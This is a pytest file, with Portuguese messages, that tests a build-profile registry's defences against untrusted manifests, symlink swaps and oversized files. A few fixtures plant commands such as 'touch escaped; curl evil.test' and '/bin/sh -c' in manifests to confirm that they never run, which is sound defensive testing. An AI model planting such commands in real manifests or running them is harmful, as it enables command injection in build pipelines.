import os
from pathlib import Path
from typing import Literal

import pytest
from pydantic import ValidationError

from app.factory.build_strategy import MAX_MANIFEST_BYTES, BuildProfileRegistry
from app.models.build import BuildPhase, BuildPhaseName, BuildProfile
from app.models.factory import (
    BuildProfileSelection,
    DirectWorkOrderSource,
    RepositoryTarget,
    WorkOrder,
    WorkspaceLease,
)

# Factory mode é POSIX por design (lock fcntl, dir_fd/O_NOFOLLOW, grupo de
# processos, caminhos de lease em /): no Windows só o mission control roda.
pytestmark = pytest.mark.skipif(os.name != "posix", reason="factory mode exige POSIX")


def _profile(
    name: str = "python-checks",
    ecosystem: Literal["python", "node"] = "python",
    *,
    auto_detect: bool = True,
) -> BuildProfile:
    argv = (
        ("/usr/local/bin/python", "-m", "pytest")
        if ecosystem == "python"
        else ("/usr/local/bin/node", "--test")
    )
    return BuildProfile(
        name=name,
        ecosystem=ecosystem,
        image="python@sha256:" + "a" * 64,
        phases=(BuildPhase(name=BuildPhaseName.TEST, argv=argv),),
        auto_detect=auto_detect,
    )


def _order(requested: str | None = None) -> WorkOrder:
    return WorkOrder(
        source=DirectWorkOrderSource(),
        repository=RepositoryTarget(full_name="acme/widgets"),
        requested_outcome="Validar a implementação solicitada.",
        acceptance_criteria=["Todos os testes passam."],
        build_profile=BuildProfileSelection(requested_profile=requested),
    )


def _lease(root: Path) -> WorkspaceLease:
    return WorkspaceLease(
        workflow_id="workflow-build",
        repository=RepositoryTarget(full_name="acme/widgets"),
        local_path=str(root),
        branch="forgehand/workflow-build",
        base_sha="a" * 40,
    )


def test_explicit_profile_precedes_mapping_and_ignores_manifests(
    tmp_path: Path,
) -> None:
    python = _profile()
    node = _profile("node-checks", "node")
    registry = BuildProfileRegistry(
        {python.name: python, node.name: node},
        {"acme/widgets": node.name},
    )
    (tmp_path / "pyproject.toml").symlink_to(tmp_path / "missing")
    (tmp_path / "package.json").write_text("invalid", encoding="utf-8")

    selection = registry.select(_order(python.name), _lease(tmp_path))

    assert selection.selection_reason == "explicit"
    assert selection.selected_profile == python.name
    assert selection.profile_digest == python.fingerprint()
    assert selection.phases == ["test"]


def test_repository_mapping_precedes_ambiguous_detection(tmp_path: Path) -> None:
    profile = _profile()
    registry = BuildProfileRegistry(
        {profile.name: profile}, {"ACME/Widgets": profile.name}
    )
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "repository_mapping"
    assert selection.selected_profile == profile.name


def test_unknown_explicit_profile_does_not_fall_back(tmp_path: Path) -> None:
    profile = _profile()
    registry = BuildProfileRegistry(
        {profile.name: profile}, {"acme/widgets": profile.name}
    )
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")

    selection = registry.select(_order("unapproved"), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert selection.requested_profile == "unapproved"
    assert selection.selected_profile is None
    assert selection.profile_digest is None
    assert selection.phases == []
    assert "desconhecido" in (selection.unsupported_reason or "")


@pytest.mark.parametrize(
    ("ecosystem", "filename", "content"),
    [
        ("python", "pyproject.toml", '[project]\nname = "sample"\n'),
        ("node", "package.json", '{"name": "sample"}'),
    ],
)
def test_detects_only_unique_operator_approved_profile(
    tmp_path: Path,
    ecosystem: Literal["python", "node"],
    filename: str,
    content: str,
) -> None:
    profile = _profile(ecosystem=ecosystem)
    registry = BuildProfileRegistry({profile.name: profile})
    (tmp_path / filename).write_text(content, encoding="utf-8")

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "detected"
    assert selection.selected_profile == profile.name
    assert registry.profile_for(selection) == profile


def test_both_ecosystems_are_unsupported_without_operator_choice(
    tmp_path: Path,
) -> None:
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert "ambígua" in (selection.unsupported_reason or "")


def test_multiple_auto_detect_profiles_require_operator_choice(tmp_path: Path) -> None:
    first = _profile("python-first")
    second = _profile("python-second")
    registry = BuildProfileRegistry({first.name: first, second.name: second})
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert "mais de um perfil" in (selection.unsupported_reason or "")


def test_non_auto_detect_profiles_are_never_inferred(tmp_path: Path) -> None:
    profile = _profile(auto_detect=False)
    registry = BuildProfileRegistry({profile.name: profile})
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert "nenhum perfil auto_detect" in (selection.unsupported_reason or "")
    assert registry.select(_order(profile.name), _lease(tmp_path)).selected_profile


def test_missing_manifests_produce_actionable_unsupported_result(
    tmp_path: Path,
) -> None:
    registry = BuildProfileRegistry({})

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert "nenhum manifesto" in (selection.unsupported_reason or "")


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        ("pyproject.toml", b"[unterminated"),
        ("package.json", b'{"unclosed":'),
        ("package.json", b"[]"),
        ("package.json", b'"scalar"'),
        ("package.json", b"\xff"),
        ("package.json", b"[" * 2000 + b"]" * 2000),
    ],
)
def test_invalid_manifests_fail_closed(
    tmp_path: Path, filename: str, content: bytes
) -> None:
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})
    (tmp_path / filename).write_bytes(content)

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert filename in (selection.unsupported_reason or "")


@pytest.mark.parametrize("filename", ["pyproject.toml", "package.json"])
def test_symlink_manifest_is_never_followed(tmp_path: Path, filename: str) -> None:
    checkout = tmp_path / "checkout"
    checkout.mkdir()
    external = tmp_path / "outside"
    external.write_text("{}" if filename.endswith("json") else "", encoding="utf-8")
    (checkout / filename).symlink_to(external)
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})

    selection = registry.select(_order(), _lease(checkout))

    assert selection.selection_reason == "unsupported"
    assert "link simbólico" in (selection.unsupported_reason or "")


@pytest.mark.parametrize("kind", ["directory", "fifo"])
def test_non_regular_manifest_is_rejected(tmp_path: Path, kind: str) -> None:
    manifest = tmp_path / "package.json"
    if kind == "directory":
        manifest.mkdir()
    else:
        os.mkfifo(manifest)
    registry = BuildProfileRegistry({})

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert "arquivo regular" in (selection.unsupported_reason or "")


def test_manifest_swapped_for_symlink_after_stat_is_not_followed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    checkout = tmp_path / "checkout"
    checkout.mkdir()
    manifest = checkout / "package.json"
    manifest.write_text("{}", encoding="utf-8")
    external = tmp_path / "external.json"
    external.write_text("{}", encoding="utf-8")
    original_lstat = Path.lstat

    def swap_after_stat(path: Path) -> os.stat_result:
        result = original_lstat(path)
        if path == manifest:
            manifest.unlink()
            manifest.symlink_to(external)
        return result

    monkeypatch.setattr(Path, "lstat", swap_after_stat)
    profile = _profile(ecosystem="node")
    registry = BuildProfileRegistry({profile.name: profile})

    selection = registry.select(_order(), _lease(checkout))

    assert selection.selection_reason == "unsupported"
    assert "com segurança" in (selection.unsupported_reason or "")


def test_manifest_growing_after_stat_is_still_bounded(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    manifest = tmp_path / "package.json"
    manifest.write_text("{}", encoding="utf-8")
    original_lstat = Path.lstat

    def grow_after_stat(path: Path) -> os.stat_result:
        result = original_lstat(path)
        if path == manifest:
            manifest.write_bytes(b"{}" + b" " * MAX_MANIFEST_BYTES)
        return result

    monkeypatch.setattr(Path, "lstat", grow_after_stat)
    profile = _profile(ecosystem="node")
    registry = BuildProfileRegistry({profile.name: profile})

    selection = registry.select(_order(), _lease(tmp_path))

    assert selection.selection_reason == "unsupported"
    assert "128 KiB" in (selection.unsupported_reason or "")


@pytest.mark.parametrize("extra_bytes", [0, 1])
def test_manifest_read_is_bounded_at_128_kib(tmp_path: Path, extra_bytes: int) -> None:
    profile = _profile(ecosystem="node")
    registry = BuildProfileRegistry({profile.name: profile})
    content = b"{}" + b" " * (MAX_MANIFEST_BYTES - 2 + extra_bytes)
    (tmp_path / "package.json").write_bytes(content)

    selection = registry.select(_order(), _lease(tmp_path))

    if extra_bytes:
        assert selection.selection_reason == "unsupported"
        assert "128 KiB" in (selection.unsupported_reason or "")
    else:
        assert selection.selection_reason == "detected"


@pytest.mark.parametrize(
    ("ecosystem", "filename", "content"),
    [
        (
            "python",
            "pyproject.toml",
            '[tool.forgehand]\ncommand = "touch escaped; curl evil.test"\n',
        ),
        (
            "node",
            "package.json",
            '{"scripts":{"test":"touch escaped; curl evil.test"}}',
        ),
    ],
)
def test_manifest_commands_never_become_approved_commands(
    tmp_path: Path,
    ecosystem: Literal["python", "node"],
    filename: str,
    content: str,
) -> None:
    profile = _profile(ecosystem=ecosystem)
    registry = BuildProfileRegistry({profile.name: profile})
    (tmp_path / filename).write_text(content, encoding="utf-8")

    selection = registry.select(_order(), _lease(tmp_path))

    assert registry.profile_for(selection).phases == profile.phases
    assert not (tmp_path / "escaped").exists()


@pytest.mark.parametrize(
    ("field", "value"),
    [("full_name", "other/repo"), ("scm_host", "other.test"), ("base_ref", "other")],
)
def test_lease_must_match_work_order_before_even_explicit_selection(
    tmp_path: Path, field: str, value: str
) -> None:
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})
    lease = _lease(tmp_path)
    lease.repository = lease.repository.model_copy(update={field: value})

    selection = registry.select(_order(profile.name), lease)

    assert selection.selection_reason == "unsupported"
    assert "não corresponde" in (selection.unsupported_reason or "")


@pytest.mark.parametrize("kind", ["missing", "file", "symlink"])
def test_workspace_path_must_be_a_real_directory(tmp_path: Path, kind: str) -> None:
    path = tmp_path / "checkout"
    if kind == "file":
        path.write_text("", encoding="utf-8")
    elif kind == "symlink":
        path.symlink_to(tmp_path, target_is_directory=True)
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})

    selection = registry.select(_order(profile.name), _lease(path))

    assert selection.selection_reason == "unsupported"
    assert "workspace" in (selection.unsupported_reason or "")


def test_unknown_mapping_is_rejected_at_construction() -> None:
    with pytest.raises(ValueError, match="mapeado desconhecido"):
        BuildProfileRegistry({}, {"acme/widgets": "missing"})


def test_profile_names_must_match_registry_keys() -> None:
    with pytest.raises(ValueError, match="chave do perfil"):
        BuildProfileRegistry({"different": _profile()})


def test_case_insensitive_repository_mapping_cannot_conflict() -> None:
    first = _profile("first")
    second = _profile("second")
    with pytest.raises(ValueError, match="conflitantes"):
        BuildProfileRegistry(
            {first.name: first, second.name: second},
            {"acme/widgets": first.name, "ACME/Widgets": second.name},
        )


def test_registry_owns_independent_profile_copies(tmp_path: Path) -> None:
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})
    selection = registry.select(_order(profile.name), _lease(tmp_path))
    profile.phases[0].environment["CI"] = "mutated-input"
    fetched = registry.get(profile.name)
    fetched.phases[0].environment["CI"] = "mutated-output"

    restored = registry.profile_for(selection)

    assert restored.phases[0].environment == {}
    restored.phases[0].environment["CI"] = "mutated-restored"
    assert registry.profile_for(selection).phases[0].environment == {}


@pytest.mark.parametrize("tamper_kind", ["environment", "model_copy"])
def test_registry_revalidates_potentially_tampered_models(tamper_kind: str) -> None:
    profile = _profile()
    if tamper_kind == "environment":
        profile.phases[0].environment["SECRET_TOKEN"] = "not-allowed"
    else:
        unsafe_phase = profile.phases[0].model_copy(
            update={"argv": ("/bin/sh", "-c", "touch escaped")}
        )
        profile = profile.model_copy(update={"phases": (unsafe_phase,)})

    with pytest.raises(ValidationError):
        BuildProfileRegistry({profile.name: profile})


def test_resume_rejects_profile_fingerprint_drift(tmp_path: Path) -> None:
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})
    selection = registry.select(_order(profile.name), _lease(tmp_path))
    changed_phase = profile.phases[0].model_copy(update={"timeout_seconds": 300})
    changed_profile = profile.model_copy(update={"phases": (changed_phase,)})
    replacement = BuildProfileRegistry({changed_profile.name: changed_profile})

    with pytest.raises(ValueError, match="fingerprint"):
        replacement.profile_for(selection)


def test_resume_rejects_missing_digest_and_changed_phase_list(tmp_path: Path) -> None:
    profile = _profile()
    registry = BuildProfileRegistry({profile.name: profile})
    selection = registry.select(_order(profile.name), _lease(tmp_path))

    with pytest.raises(ValueError, match="fingerprint"):
        registry.profile_for(selection.model_copy(update={"profile_digest": None}))
    with pytest.raises(ValueError, match="fases registradas"):
        registry.profile_for(selection.model_copy(update={"phases": ["lint"]}))


def test_resume_rejects_unsupported_selection() -> None:
    registry = BuildProfileRegistry({})

    with pytest.raises(ValueError, match="não contém"):
        registry.profile_for(BuildProfileSelection(selection_reason="unsupported"))
